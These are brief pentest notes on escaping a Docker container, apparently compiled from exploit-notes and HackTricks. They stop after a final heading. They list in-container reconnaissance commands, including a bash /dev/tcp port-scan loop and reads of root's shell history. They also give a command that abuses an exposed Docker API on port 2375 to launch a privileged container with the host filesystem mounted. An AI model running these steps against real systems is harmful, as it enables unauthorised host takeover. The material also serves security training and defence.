# Docker escape

### Investigation

[https://exploit-notes.hdks.org/exploit/container/docker/docker-escape/#investigation](https://exploit-notes.hdks.org/exploit/container/docker/docker-escape/#investigation)

If we are in the docker container, we first need to investigate basic information about the container.

```bash
# Network
ip addr
netstat -punta
ss -ltu
cat /etc/hosts

# Port scan another host
nmap 172.17.0.1
for i in {1..65535}; do (echo > /dev/tcp/172.17.0.1/$i) >/dev/null 2>&1 && echo $i is open; done

# History
cat /root/.bash_history
cat /home/<username>/.bash_history

# Interesting Directories
ls -al /etc
ls -al /opt
ls -al /srv
ls -al /var/www

# SSH
ssh <user>@<another_host>

# Check if docker command is available.
# If not, find the command in the container.
docker -h
find / -name "docker" 2>/dev/null

# Container capabilities
capsh --print

```

### Run a new vulnerable docker machine.

[https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker#compromising](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker#compromising)

Abusing this it's possible to escape form a container, you could run a weak container in the remote machine, escape from it, and compromise the machine:

```bash
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cd /mnt/
```

Run existing docker image

